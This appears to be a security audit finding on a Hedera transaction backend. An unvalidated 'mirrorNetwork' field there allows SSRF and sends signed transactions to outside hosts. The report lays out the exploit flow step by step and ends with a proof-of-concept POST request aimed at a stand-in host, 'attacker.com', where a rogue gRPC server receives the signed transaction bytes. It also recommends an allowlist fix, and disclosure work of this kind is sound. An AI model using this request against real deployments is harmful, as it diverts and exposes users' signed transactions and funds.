### Title
Unvalidated `mirrorNetwork` Field Allows Arbitrary Network Routing and SSRF During Transaction Execution

### Summary
The `mirrorNetwork` field in `CreateTransactionDto` is accepted as a free-form string with no allowlist validation. It is stored verbatim in the database and later used by `ExecuteService._executeTransaction` to build a Hedera SDK client, causing the backend to make outbound gRPC connections to any attacker-supplied host and to execute signed transactions against attacker-controlled infrastructure.

### Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` declares `mirrorNetwork` as:

```typescript
@IsNotEmpty()
@IsString()
mirrorNetwork: string;
``` [1](#0-0) 

Only `@IsNotEmpty()` and `@IsString()` are applied — no enum constraint, no allowlist check against `mainnet | testnet | previewnet | local-node`.

**Step 1 — creation path stores the raw value:**

`createTransactions` passes `dtos[0].mirrorNetwork` directly to `getClientFromNetwork`, then persists `data.mirrorNetwork` (which equals `dto.mirrorNetwork`) into the `Transaction` row: [2](#0-1) 

**Step 2 — `getClientFromNetwork` makes an outbound gRPC connection to the supplied URL:**

When the value is not one of the four known strings, the function treats it as a custom mirror-node base URL, opens a gRPC connection to it, and fetches the address book:

```typescript
const client = Client.forNetwork({}).setMirrorNetwork(
  MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),
);
const nodeAddressBook = await new AddressBookQuery()
  .setFileId(FileId.ADDRESS_BOOK)
  .execute(client);          // ← outbound gRPC to attacker host
client.setNetworkFromAddressBook(nodeAddressBook);
``` [3](#0-2) 

**Step 3 — execution path re-uses the stored value:**

`ExecuteService._executeTransaction` calls `getClientFromNetwork(transaction.mirrorNetwork)` again with the persisted value, then submits the fully-signed transaction to whatever nodes the attacker's address-book response advertised: [4](#0-3) 

**Exploit flow:**

1. Attacker (authenticated org user) POSTs `POST /transactions` with `mirrorNetwork: "attacker.com"` and valid `transactionBytes` / `signature`.
2. Backend calls `getClientFromNetwork("attacker.com")` → gRPC to `attacker.com:443` (SSRF hit #1).
3. Attacker's gRPC server returns a crafted address book pointing to attacker-controlled Hedera nodes.
4. Node validation (`isTransactionValidForNodes`) runs against the attacker-supplied node set — passes trivially if the attacker echoes back node IDs that match the transaction.
5. Transaction is saved with `mirrorNetwork = "attacker.com"`.
6. When the chain service later executes the transaction, `_executeTransaction` calls `getClientFromNetwork("attacker.com")` again (SSRF hit #2) and submits the signed transaction bytes to the attacker's nodes.

### Impact Explanation

- **SSRF**: The backend makes two outbound gRPC connections to an attacker-controlled host per transaction lifecycle. This can be used to probe internal services reachable from the backend pod (e.g., metadata endpoints, internal APIs, other microservices).
- **Transaction misdirection**: Fully-signed multi-party transactions (potentially carrying significant HBAR or token operations) are submitted to attacker-controlled infrastructure instead of the real Hedera network. The attacker receives the signed transaction bytes, can withhold submission, replay them later, or observe sensitive transaction contents.
- **Cross-network confusion**: An attacker can store `mirrorNetwork: "mainnet"` for a transaction whose bytes were intended for testnet (or vice versa), causing execution on the wrong network and permanent loss of funds if the transaction is valid on both.

### Likelihood Explanation

Any authenticated organization-mode user can reach `POST /transactions` without any elevated privilege. The `mirrorNetwork` field is a normal part of the documented API contract. No leaked credentials or admin access are required. The attacker only needs to run a gRPC server that speaks the Hedera SDK's `AddressBookQuery` protocol, which is publicly documented.

### Recommendation

Validate `mirrorNetwork` against an explicit allowlist at the DTO layer:

```typescript
import { IsIn } from 'class-validator';

@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])
mirrorNetwork: string;
```

If custom mirror nodes must be supported, apply strict URL validation (scheme, hostname allowlist, or operator-configured list) and store a canonical network identifier separately from the raw URL so that execution always uses a server-side-resolved endpoint rather than the raw user-supplied string.

### Proof of Concept

```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_org_user_token>
Content-Type: application/json

{
  "name": "PoC",
  "description": "SSRF via mirrorNetwork",
  "transactionBytes": "<hex-encoded valid AccountCreateTransaction bytes>",
  "creatorKeyId": 1,
  "signature": "<valid signature over transactionBytes>",
  "mirrorNetwork": "attacker.com"
}
```

**Expected (vulnerable) behaviour:**
1. Backend immediately opens a gRPC connection to `attacker.com:443` and issues an `AddressBookQuery`.
2. Transaction is saved with `mirrorNetwork = "attacker.com"`.
3. On execution, backend again connects to `attacker.com:443` and submits the signed transaction bytes.

**Attacker-side**: run a gRPC server on port 443 that responds to `AddressBookQuery` with a crafted node list. Observe the incoming signed transaction bytes on the second call. [1](#0-0) [3](#0-2) [5](#0-4)
